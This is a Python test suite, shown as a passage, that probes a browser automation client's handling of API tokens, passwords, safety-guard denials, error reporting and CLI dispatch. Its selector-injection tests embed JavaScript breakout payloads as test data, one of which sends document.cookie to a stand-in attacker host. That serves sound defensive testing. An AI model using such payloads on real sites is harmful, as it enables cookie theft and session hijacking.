#!/usr/bin/env python3
"""
Adversarial tests for agent/browser_agent.py.

browser_agent.py is both a CLI and a library: callers import
BrowserAutomationAgent and drive a real browser with it. That makes three
things load-bearing, and none of them were covered:

  * Credentials. login() and fill_form() take plaintext secrets. The MCP
    server redacts them from its log and its audit trail
    (mcp-server/server.py:184, mcp-server/safety.py:181) and the extension
    refuses password fields unless the operator opts in
    (extension/content.js:379). The client sits in front of all of that, so
    if the client prints or retains the secret the server's redaction buys
    nothing.
  * The API token. It is the only thing between a local process and full
    control of the browser. It must reach the server and go nowhere else.
  * Honesty. Every method here returns a dict or a list that a caller (often
    an LLM) reads as the outcome. A refusal reported as a success, or a
    transport failure reported as a tool failure, makes the caller act on
    something that never happened.

Tests marked "CURRENT BEHAVIOUR" pin down what the code does today, as a
regression guard. Every other test asserts the behaviour the project's own
stated policy requires, so a failure there is a defect in the source, not in
the test.

No test touches the network: urlopen is replaced for the whole of every test
case, and the stub raises if the client makes a request the test did not
queue a response for.

Run: python3 -m unittest tests.test_browser_agent -v
"""

import io
import json
import re
import shutil
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

from tests import TEST_HOME  # noqa: F401  (redirects HOME on import)

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / 'agent'))

import browser_agent  # noqa: E402

# Captured before any test patches it.
DEFAULT_TOKEN_FILE = browser_agent._TOKEN_FILE

PASSWORD = 'c0rrect-horse-battery-staple'
TOKEN = 'tok-deadbeefdeadbeefdeadbeef'


class LoopGuard(BaseException):
    """Breaks a client loop that would otherwise spin forever.

    Deliberately a BaseException so the production code's bare
    'except Exception' cannot swallow it.
    """


# --------------------------------------------------------------------------
# Transport stub
# --------------------------------------------------------------------------

class FakeResponse:
    """Stands in for the HTTPResponse that urlopen returns."""

    def __init__(self, body, status=200):
        if not isinstance(body, bytes):
            body = body.encode('utf-8')
        self._body = body
        self.status = status

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class SentRequest:
    """What the client actually put on the wire."""

    def __init__(self, req, timeout):
        self.url = req.full_url
        self.method = req.get_method()
        self.timeout = timeout
        # urllib title-cases header names, so normalise them for lookups.
        self.headers = {k.lower(): v for k, v in req.headers.items()}
        self.raw_body = req.data

    def header(self, name):
        return self.headers.get(name.lower())

    @property
    def body(self):
        if not self.raw_body:
            return None
        return json.loads(self.raw_body.decode('utf-8'))

    @property
    def arguments(self):
        return (self.body or {}).get('arguments', {})


class Transport:
    """Replays queued responses and records every request."""

    def __init__(self):
        self.queue = []
        self.requests = []

    def __call__(self, req, timeout=None):
        self.requests.append(SentRequest(req, timeout))
        if not self.queue:
            raise AssertionError(
                'the client made an unexpected request to %s (the test queued '
                'no response for it)' % req.full_url)
        nxt = self.queue.pop(0)
        if isinstance(nxt, BaseException):
            raise nxt
        return nxt


def http_error(code, reason, body=b'{"error": "Unauthorized"}'):
    return browser_agent.urllib.error.HTTPError(
        browser_agent.MCP_SERVER_URL + '/mcp/call', code, reason, {},
        io.BytesIO(body))


# --------------------------------------------------------------------------
# JS string-literal decoding, for the selector-interpolation tests
# --------------------------------------------------------------------------

_SELECTOR_LITERAL = re.compile(
    r"""querySelectorAll\(\s*(['"])((?:\\.|(?!\1)[^\\])*)\1\s*\)""", re.S)

_JS_ESCAPES = {'n': '\n', 't': '\t', 'r': '\r', 'b': '\b',
               'f': '\f', 'v': '\v', '0': '\0'}


def decode_js_string(body):
    """Decode the body of a JS string literal the way a JS engine would.

    An unrecognised escape yields the escaped character itself, which is
    exactly why pasting a raw CSS selector into JS source is a bug:
    '.md\\:flex' becomes '.md:flex'.
    """
    out, i = [], 0
    while i < len(body):
        ch = body[i]
        if ch == '\\' and i + 1 < len(body):
            nxt = body[i + 1]
            if nxt == 'u' and len(body) >= i + 6:
                out.append(chr(int(body[i + 2:i + 6], 16)))
                i += 6
                continue
            if nxt == 'x' and len(body) >= i + 4:
                out.append(chr(int(body[i + 2:i + 4], 16)))
                i += 4
                continue
            out.append(_JS_ESCAPES.get(nxt, nxt))
            i += 2
            continue
        out.append(ch)
        i += 1
    return ''.join(out)


# --------------------------------------------------------------------------
# Base case
# --------------------------------------------------------------------------

class AgentTestCase(unittest.TestCase):

    def setUp(self):
        self.transport = Transport()
        patcher = mock.patch.object(
            browser_agent.urllib.request, 'urlopen', self.transport)
        patcher.start()
        self.addCleanup(patcher.stop)

        # Each test gets its own token file, so the real installation and the
        # shared test HOME are both left alone. Absent unless a test writes it.
        token_dir = tempfile.mkdtemp(prefix='ccb-agent-test-')
        self.addCleanup(shutil.rmtree, token_dir, True)
        self.token_file = Path(token_dir) / 'api_token'
        token_patcher = mock.patch.object(
            browser_agent, '_TOKEN_FILE', self.token_file)
        token_patcher.start()
        self.addCleanup(token_patcher.stop)

    # -- stub helpers ------------------------------------------------------

    def serve(self, *responses):
        """Queue raw responses: a FakeResponse, or an exception to raise."""
        self.transport.queue.extend(responses)

    def serve_json(self, *payloads):
        for payload in payloads:
            self.transport.queue.append(FakeResponse(json.dumps(payload)))

    def serve_ok(self, count=1, **payload):
        for _ in range(count):
            self.serve_json({'success': True, **payload})

    def serve_denial(self, count=1, decision='confirmation_required'):
        """What mcp-server/safety.py hands back for a guarded action."""
        for _ in range(count):
            self.serve_json({
                'success': False,
                'safety_decision': decision,
                'error': 'browser_type on a protected site requires '
                         'confirmation. Repeat the exact same call with '
                         'confirm_token.',
                'confirm_token': 'abc123',
            })

    def serve_password_refusal(self, count=1):
        """What the extension returns by default for a password field."""
        for _ in range(count):
            self.serve_json({
                'success': False,
                'error': 'Refused: target is a password field. Use the '
                         'browser’s own password manager (autofill) for '
                         'credentials, or set "allow_password_typing": true '
                         'in ~/.claudecodebrowser/safety.json if you really '
                         'want automated password entry.',
            })

    # -- assertion helpers -------------------------------------------------

    @property
    def requests(self):
        return self.transport.requests

    def only_request(self):
        self.assertEqual(len(self.requests), 1,
                         'expected exactly one HTTP request, got %d'
                         % len(self.requests))
        return self.requests[0]

    def history_dump(self, agent):
        """Everything the agent kept about what it did."""
        return repr([(a.action_type, a.parameters, a.result, a.error)
                     for a in agent.action_history])

    def capture(self, fn, *args, **kwargs):
        buf = io.StringIO()
        with redirect_stdout(buf):
            result = fn(*args, **kwargs)
        return result, buf.getvalue()

    def outcome(self, fn, *args, **kwargs):
        """Call fn and report either value or exception.

        Several methods could reasonably signal a refusal by raising or by
        returning something falsifiable; these tests accept either, so they
        pin the requirement without dictating the fix.
        """
        try:
            return 'returned', fn(*args, **kwargs)
        except Exception as exc:  # noqa: BLE001 - raising is an acceptable fix
            return 'raised', exc

    def assert_selector_is_data_not_code(self, script, selector):
        match = _SELECTOR_LITERAL.search(script)
        self.assertIsNotNone(
            match,
            'the selector was interpolated so that querySelectorAll() no '
            'longer holds one well-formed string literal: the rest of the '
            'selector is now executable JavaScript. Script:\n%s' % script)
        decoded = decode_js_string(match.group(2))
        self.assertEqual(
            decoded, selector,
            'the selector must reach querySelectorAll() unchanged, as data. '
            'It arrived as %r instead of %r. Encode it (json.dumps, or any '
            'escaping that round-trips) instead of pasting it into the '
            'source. Script:\n%s' % (decoded, selector, script))


# --------------------------------------------------------------------------
# 1. API token
# --------------------------------------------------------------------------

class ApiTokenTests(AgentTestCase):
    """The token authorises full control of the browser. It has to reach the
    server, and it must not reach anything else."""

    def test_the_token_is_read_from_the_user_configuration_directory(self):
        # CURRENT BEHAVIOUR (regression guard): never from the repo or /tmp.
        self.assertEqual(
            DEFAULT_TOKEN_FILE,
            Path(TEST_HOME) / '.claudecodebrowser' / 'api_token')

    def test_the_token_is_sent_when_the_file_exists(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        self.assertEqual(self.only_request().header('X-API-Key'), TOKEN)

    def test_surrounding_whitespace_is_stripped_from_the_token(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text('  %s\n' % TOKEN)
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        self.assertEqual(self.only_request().header('X-API-Key'), TOKEN)

    def test_a_missing_token_file_sends_no_token_header(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        req = self.only_request()
        self.assertIsNone(req.header('X-API-Key'))
        self.assertEqual(req.header('Content-Type'), 'application/json')

    def test_an_unreadable_token_file_does_not_crash_the_client(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.token_file.chmod(0o000)
        self.addCleanup(self.token_file.chmod, 0o600)
        self.serve_ok()
        result = browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        self.assertTrue(result.get('success'))
        self.assertIsNone(self.only_request().header('X-API-Key'))

    # DEFECT D14: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_an_empty_token_file_sends_no_token_header(self):
        """An empty or whitespace-only token file means "not configured".
        Sending X-API-Key: '' instead turns that into a bare 403, so the user
        is told they are unauthorised rather than that their token file is
        empty."""
        self.token_file.write_text('   \n')
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        self.assertIsNone(
            self.only_request().header('X-API-Key'),
            'an empty token file must not be sent as an empty credential')

    # DEFECT D6: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_the_token_is_not_sent_to_a_non_loopback_server(self):
        """CLAUDE_BROWSER_URL chooses the server. The token is a local secret
        for a loopback service, so it must not be attached to a request that
        leaves the machine: one stray environment variable otherwise
        exfiltrates full control of the user's browser."""
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        with mock.patch.object(browser_agent, 'MCP_SERVER_URL',
                               'http://collector.example.net:8765'):
            browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        req = self.only_request()
        self.assertIsNone(
            req.header('X-API-Key'),
            'the API token was sent to %s' % req.url)

    def test_the_token_never_reaches_stdout_in_verbose_mode(self):
        # CURRENT BEHAVIOUR (regression guard): headers are not logged.
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.navigate, 'https://example.com')
        self.assertNotIn(TOKEN, out)

    def test_the_token_is_not_retained_in_the_action_history(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.navigate('https://example.com')
        self.assertNotIn(TOKEN, self.history_dump(agent))

    def test_a_403_error_message_does_not_quote_the_token(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.serve(http_error(403, 'Forbidden'))
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        result, out = self.capture(agent.navigate, 'https://example.com')
        self.assertNotIn(TOKEN, json.dumps(result))
        self.assertNotIn(TOKEN, out)


# --------------------------------------------------------------------------
# 2. Credential handling
# --------------------------------------------------------------------------

class CredentialHandlingTests(AgentTestCase):

    # DEFECT D1: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_a_password_is_not_printed_in_verbose_mode(self):
        self.serve_password_refusal()
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.type_text, PASSWORD,
                              selector='input[type="password"]')
        self.assertNotIn(
            PASSWORD, out,
            'browser_agent.py:97 logs the raw kwargs, so --verbose prints the '
            'password to the terminal and into any captured session log, '
            'undoing the redaction the server and the audit log perform. '
            'Redact the argument names server.py already treats as '
            'sensitive before logging them.')

    # DEFECT D2: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_a_password_is_not_retained_in_the_action_history(self):
        self.serve_password_refusal()
        agent = browser_agent.BrowserAutomationAgent()
        agent.login('alice', PASSWORD, submit_selector='#go')
        self.assertNotIn(
            PASSWORD, self.history_dump(agent),
            'browser_agent.py:104-112 keeps the raw kwargs in action_history, '
            'so the plaintext password stays in the process for the life of '
            'the agent and reaches any dump, traceback or crash report that '
            'touches it.')

    # DEFECT D3: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_verbose_mode_does_not_echo_a_credential_back_from_a_result(self):
        """browser_agent.py:116 prints the entire server result. Results from
        the browser echo arguments back (the extension's not-found error
        embeds JSON.stringify(options), and browser_get_value returns field
        contents), so printing them wholesale is a second path for the same
        secret."""
        self.serve_json({'success': True, 'value': PASSWORD})
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.get_value, '#password')
        self.assertNotIn(PASSWORD, out)

    # DEFECT D5: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_login_does_not_submit_the_form_after_the_password_is_refused(self):
        """Under the shipped default (allow_password_typing: false) the
        password step always fails. Pressing Enter anyway submits the form
        with a username and an empty password: a real failed login attempt
        against the real site, repeatable until the account locks."""
        self.serve_ok()                  # username typed
        self.serve_password_refusal()    # password refused by the extension
        self.serve_ok()                  # the submit that must not happen
        agent = browser_agent.BrowserAutomationAgent()
        agent.login('alice', PASSWORD)
        tools = [r.body['name'] for r in self.requests]
        self.assertEqual(
            len(self.requests), 2,
            'login() submitted the form after the password step was refused: '
            '%s' % tools)

    # DEFECT D5: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_login_does_not_look_successful_when_the_password_was_refused(self):
        self.serve_ok()
        self.serve_password_refusal()
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.login('alice', PASSWORD, submit_selector='#go')
        self.assertFalse(
            results[-1].get('success'),
            'the last entry login() returns is what a caller reads as the '
            'outcome, and it reports success although the credential never '
            'reached the field: %r' % (results,))

    # DEFECT D4: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_fill_form_does_not_resend_a_credential_after_a_refusal(self):
        """fill_form's retry exists for a wrong locator. A password-field
        refusal is not a wrong locator, so the retry simply posts the secret
        to the server a second time."""
        self.serve_password_refusal(2)
        agent = browser_agent.BrowserAutomationAgent()
        agent.fill_form({'password': PASSWORD})
        sent = [r for r in self.requests if PASSWORD in json.dumps(r.arguments)]
        self.assertLessEqual(
            len(sent), 1,
            'the password was transmitted %d times' % len(sent))


# --------------------------------------------------------------------------
# 3. Selector interpolation into JavaScript
# --------------------------------------------------------------------------

class SelectorInterpolationTests(AgentTestCase):
    """extract_text and extract_links paste the caller's selector straight
    into JS source inside single quotes. A selector is data: it comes from
    page content, from config or from an LLM, and the browser executes
    whatever it turns into."""

    def _script_for(self, method, selector):
        self.serve_json({'success': True, 'result': ''})
        method(selector)
        return self.only_request().arguments['script']

    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_extract_text_selector_cannot_break_out_of_the_literal(self):
        agent = browser_agent.BrowserAutomationAgent()
        selector = "a'); fetch('https://evil.example/?c='+document.cookie); ('"
        script = self._script_for(agent.extract_text, selector)
        self.assert_selector_is_data_not_code(script, selector)

    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_extract_links_selector_cannot_break_out_of_the_literal(self):
        agent = browser_agent.BrowserAutomationAgent()
        selector = "a'); document.location='https://evil.example'; ('"
        script = self._script_for(agent.extract_links, selector)
        self.assert_selector_is_data_not_code(script, selector)

    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_an_escaped_css_selector_survives_interpolation(self):
        """Not only a security bug: '.md\\:flex' is an everyday Tailwind
        selector. JS eats the backslash, the browser is asked for '.md:flex',
        and the caller is told, plausibly, that nothing matched."""
        agent = browser_agent.BrowserAutomationAgent()
        selector = r'.md\:flex'
        script = self._script_for(agent.extract_text, selector)
        self.assert_selector_is_data_not_code(script, selector)

    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_a_quoted_attribute_selector_survives_interpolation(self):
        agent = browser_agent.BrowserAutomationAgent()
        selector = "[data-label='it\\'s here']"
        script = self._script_for(agent.extract_text, selector)
        self.assert_selector_is_data_not_code(script, selector)


# --------------------------------------------------------------------------
# 4. Transport failures versus tool failures
# --------------------------------------------------------------------------

class ErrorReportingTests(AgentTestCase):
    """Every failure mode collapses into {'success': False, 'error': str}. A
    caller cannot tell "the server is down" from "the element is missing"
    from "your token is wrong", and those need opposite responses."""

    def _navigate(self, *responses):
        self.serve(*responses)
        return browser_agent.BrowserAutomationAgent().navigate('https://e.test')

    def test_a_refused_connection_is_reported_as_a_connection_failure(self):
        # CURRENT BEHAVIOUR (regression guard): this one is right.
        result = self._navigate(
            browser_agent.urllib.error.URLError(ConnectionRefusedError(61)))
        self.assertFalse(result.get('success'))
        self.assertIn('Connection failed', result['error'])

    def test_a_tool_failure_is_passed_through_unchanged(self):
        # CURRENT BEHAVIOUR (regression guard).
        result = self._navigate(
            FakeResponse('{"success": false, "error": "Element not found"}'))
        self.assertEqual(result,
                         {'success': False, 'error': 'Element not found'})

    # DEFECT D12: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_a_403_is_reported_as_an_authentication_failure(self):
        """HTTPError subclasses URLError, so a rejected token comes back as
        "Connection failed: HTTP Error 403: Forbidden". The user restarts a
        server that was never down, and the server's own
        {"error": "Unauthorized"} body is discarded."""
        result = self._navigate(http_error(403, 'Forbidden'))
        self.assertFalse(result.get('success'))
        self.assertIn('403', result['error'])
        self.assertNotIn(
            'Connection failed', result['error'],
            'a server that answered and rejected the token is not a '
            'connection failure: %r' % result['error'])

    # DEFECT D12: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_an_http_500_is_not_reported_as_a_connection_failure(self):
        result = self._navigate(http_error(500, 'Internal Server Error'))
        self.assertFalse(result.get('success'))
        self.assertIn('500', result['error'])
        self.assertNotIn('Connection failed', result['error'])

    # DEFECT D12: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_a_non_json_body_is_reported_as_an_invalid_response(self):
        """A proxy or captive portal answering 200 with HTML yields
        "Expecting value: line 1 column 1 (char 0)", which tells the user
        nothing about where the problem is."""
        result = self._navigate(FakeResponse('<html>Proxy error</html>'))
        self.assertFalse(result.get('success'))
        self.assertTrue(
            any(word in result['error'].lower()
                for word in ('json', 'response', 'invalid')),
            'a bare parser message was handed to the caller: %r'
            % result['error'])

    def test_a_timeout_does_not_raise_at_the_caller(self):
        # CURRENT BEHAVIOUR (regression guard): the message is opaque ("timed
        # out"), but the library must not throw.
        result = self._navigate(TimeoutError('timed out'))
        self.assertFalse(result.get('success'))

    # DEFECT D12: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_a_transport_failure_is_distinguishable_from_a_tool_failure(self):
        """The decision a caller must make differs completely: retry the
        request, or stop and tell the user the element is not there. Both
        arrive as {'success': False, 'error': ...} and nothing else."""
        self.serve(browser_agent.urllib.error.URLError('nope'))
        transport = browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        self.serve_json({'success': False, 'error': 'Element not found'})
        tool = browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        self.assertNotEqual(
            set(transport) - {'error'}, set(tool) - {'error'},
            'a transport failure and a tool failure have the same shape, so '
            'no caller can tell them apart: %r vs %r' % (transport, tool))

    def test_check_server_is_false_when_the_server_is_unreachable(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve(
            browser_agent.urllib.error.URLError(ConnectionRefusedError(61)))
        self.assertFalse(browser_agent.BrowserAutomationAgent().check_server())

    def test_check_server_is_false_when_health_does_not_report_ok(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_json({'status': 'degraded'})
        self.assertFalse(browser_agent.BrowserAutomationAgent().check_server())

    def test_check_server_uses_get_on_the_health_endpoint(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_json({'status': 'ok'})
        self.assertTrue(browser_agent.BrowserAutomationAgent().check_server())
        req = self.only_request()
        self.assertEqual(req.method, 'GET')
        self.assertTrue(req.url.endswith('/health'))


# --------------------------------------------------------------------------
# 5. Safety-guard denials
# --------------------------------------------------------------------------

class SafetyDecisionTests(AgentTestCase):
    """The guard answers with {'success': False, 'safety_decision': ...}:
    confirmation_required, read_only, blocked_url, human_denied. A client
    that reads a refusal as "nothing there", or retries it, is worse than one
    that stops."""

    # DEFECT D8: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    def test_extract_text_distinguishes_a_denial_from_an_empty_page(self):
        """A denial and "no matching text" both return None, so a caller
        concludes the text is not on the page when the guard refused to
        look."""
        self.serve_json({'success': False,
                         'safety_decision': 'read_only',
                         'error': 'browser_execute_script is refused in '
                                  'read-only mode.'})
        agent = browser_agent.BrowserAutomationAgent()
        how, value = self.outcome(agent.extract_text, 'h1')
        if how == 'raised':
            return  # raising is an acceptable way to signal the refusal
        self.assertIsNotNone(
            value,
            'extract_text() returned None for a read_only denial, which is '
            'exactly what it returns for a page with no matching text')

    # DEFECT D8: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_extract_links_distinguishes_a_denial_from_a_page_with_no_links(self):
        self.serve_json({'success': False,
                         'safety_decision': 'blocked_url',
                         'error': 'URL matches blocked_url_patterns.'})
        agent = browser_agent.BrowserAutomationAgent()
        how, value = self.outcome(agent.extract_links)
        if how == 'raised':
            return
        self.assertNotEqual(
            value, [],
            'extract_links() returned [] for a blocked_url denial, which a '
            'caller reads as "this page has no links"')

    # DEFECT D9: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_fill_form_does_not_retry_a_safety_denial(self):
        """The retry is for a wrong locator. confirmation_required means stop
        and ask the human; retrying with a different locator spends the rate
        limit and works around the point of the confirmation."""
        self.serve_denial(2)
        agent = browser_agent.BrowserAutomationAgent()
        agent.fill_form({'email': 'alice@example.com'})
        self.assertEqual(
            len(self.requests), 1,
            'fill_form retried an action the safety guard refused')

    # DEFECT D10: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_fill_form_reports_a_submit_that_never_happened(self):
        """With no submit_selector, fill_form tries four selectors and appends
        nothing when they all fail. The caller gets a results list that looks
        like a clean fill and cannot tell the form was never submitted."""
        self.serve_ok(1)       # the field
        self.serve_denial(4)   # every candidate submit button
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.fill_form({'#email': 'alice@example.com'}, submit=True)
        self.assertEqual(
            len(results), 2,
            'fill_form(submit=True) returned %d result(s): the failed submit '
            'is invisible to the caller' % len(results))
        self.assertFalse(results[-1].get('success'))

    # DEFECT D11: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_search_reports_a_denial_of_the_query_typing(self):
        """search() discards the result of typing the query and returns the
        result of pressing Enter. A denied query plus a successful Enter reads
        as a successful search."""
        self.serve_denial(1)   # typing the query was refused
        self.serve_ok(1)       # pressing Enter succeeded
        agent = browser_agent.BrowserAutomationAgent()
        how, result = self.outcome(agent.search, 'quarterly results')
        if how == 'raised':
            return
        self.assertFalse(
            result.get('success'),
            'search() reported success although the query was never typed')

    def test_get_page_info_does_not_cache_a_denied_result(self):
        # CURRENT BEHAVIOUR (regression guard): this one is right.
        self.serve_json({'success': False, 'safety_decision': 'read_only',
                         'error': 'refused'})
        agent = browser_agent.BrowserAutomationAgent()
        agent.get_page_info()
        self.assertIsNone(agent.current_page_info)

    def test_a_denial_is_recorded_in_the_history_as_a_failure(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_denial(1)
        agent = browser_agent.BrowserAutomationAgent()
        agent.click(selector='#pay')
        action = agent.action_history[-1]
        self.assertFalse(action.success)
        self.assertIsNotNone(action.error)


# --------------------------------------------------------------------------
# 6. Request shape
# --------------------------------------------------------------------------

class RequestShapeTests(AgentTestCase):

    def test_call_tool_posts_the_tool_name_and_arguments(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.call_tool('browser_navigate', url='https://example.com')
        req = self.only_request()
        self.assertEqual(req.method, 'POST')
        self.assertTrue(req.url.endswith('/mcp/call'))
        self.assertEqual(req.body,
                         {'name': 'browser_navigate',
                          'arguments': {'url': 'https://example.com'}})
        self.assertEqual(req.timeout, 30)

    def test_screenshot_asks_the_server_to_save_the_file(self):
        # CURRENT BEHAVIOUR (regression guard): the image must not come back
        # through this client as base64 for a caller to print.
        self.serve_ok(path='/tmp/x.png')
        agent = browser_agent.BrowserAutomationAgent()
        agent.screenshot()
        self.assertIs(self.only_request().arguments['save_to_file'], True)

    def test_omitted_locators_are_not_sent(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.click(selector='#ok')
        self.assertEqual(set(self.only_request().arguments),
                         {'selector', 'double_click', 'right_click'})

    def test_click_coordinates_of_zero_are_sent(self):
        # CURRENT BEHAVIOUR (regression guard): 0 is a valid coordinate.
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.click(x=0, y=0)
        args = self.only_request().arguments
        self.assertEqual((args.get('x'), args.get('y')), (0, 0))

    # DEFECT D16: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_reload_localhost_honours_port_zero_or_rejects_it(self):
        """reload_localhost(port=0) tests the port with 'if port:', so 0
        silently becomes "reload every localhost tab" instead of the one port
        asked for. --reload-localhost 0 reaches this."""
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.reload_localhost(port=0)
        args = self.only_request().arguments
        self.assertNotIn(
            'url_pattern', args,
            'port 0 was dropped and every localhost tab was reloaded: %r'
            % args)


# --------------------------------------------------------------------------
# 7. CLI surface
# --------------------------------------------------------------------------

class CliTests(AgentTestCase):

    def run_main(self, *argv):
        buf = io.StringIO()
        code = None
        with mock.patch.object(sys, 'argv', ['browser_agent.py', *argv]):
            with redirect_stdout(buf):
                try:
                    browser_agent.main()
                except SystemExit as exc:
                    code = exc.code
        return code, buf.getvalue()

    def test_check_reports_a_healthy_server_and_exits_zero(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_json({'status': 'ok'})
        code, out = self.run_main('--check')
        self.assertEqual(code, 0)
        self.assertIn('running', out)

    def test_check_exits_nonzero_when_the_server_is_unavailable(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve(browser_agent.urllib.error.URLError('refused'))
        code, out = self.run_main('--check')
        self.assertEqual(code, 1)
        self.assertIn('not available', out)

    def test_no_arguments_prints_help_and_makes_no_request(self):
        # CURRENT BEHAVIOUR (regression guard).
        _, out = self.run_main()
        self.assertIn('--interactive', out)
        self.assertEqual(self.requests, [])

    def test_verbose_navigate_logs_the_tool_call(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        _, out = self.run_main('--verbose', '--navigate', 'https://example.com')
        self.assertIn('[BrowserAgent]', out)
        self.assertIn('browser_navigate', out)

    # DEFECT D13: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_command_dispatch_rejects_a_dunder_attribute(self):
        """--command does getattr(agent, name) on whatever it is handed and
        calls it. '__init__' re-runs the constructor and wipes the action
        history, and the printed "null" tells the user nothing happened
        wrong."""
        _, out = self.run_main('--command', '__init__')
        self.assertIn(
            'Unknown command', out,
            '--command dispatched to a dunder attribute instead of refusing '
            'it; only the documented commands should be reachable')
        self.assertEqual(self.requests, [])

    # DEFECT D13: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_command_dispatch_rejects_an_internal_method(self):
        _, out = self.run_main('--command', 'log oops')
        self.assertIn('Unknown command', out)

    # DEFECT D13: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_command_with_the_wrong_number_of_arguments_fails_cleanly(self):
        """'--command login alice' calls login(username, password) one
        argument short, and the TypeError escapes main() as a traceback."""
        try:
            _, out = self.run_main('--command', 'login alice')
        except TypeError as exc:
            self.fail('--command crashed with an unhandled TypeError: %s' % exc)
        self.assertIn('Unknown command', out)


class InteractiveModeTests(AgentTestCase):

    def drive(self, lines, responses=(), verbose=False):
        self.serve(*responses)
        buf = io.StringIO()
        agent = browser_agent.BrowserAutomationAgent(verbose=verbose)
        with mock.patch.object(browser_agent, 'input',
                               mock.Mock(side_effect=list(lines)),
                               create=True):
            with redirect_stdout(buf):
                browser_agent.interactive_mode(agent)
        return buf.getvalue()

    def test_exit_leaves_the_loop_without_a_request(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive(['exit'])
        self.assertIn('Goodbye', out)
        self.assertEqual(self.requests, [])

    def test_navigate_passes_the_url_through_and_prints_the_result(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive(
            ['navigate https://example.com', 'exit'],
            [FakeResponse('{"success": true, "url": "https://example.com"}')])
        self.assertEqual(self.only_request().arguments['url'],
                         'https://example.com')
        self.assertIn('"success": true', out)

    def test_an_unknown_command_is_reported_and_does_not_exit(self):
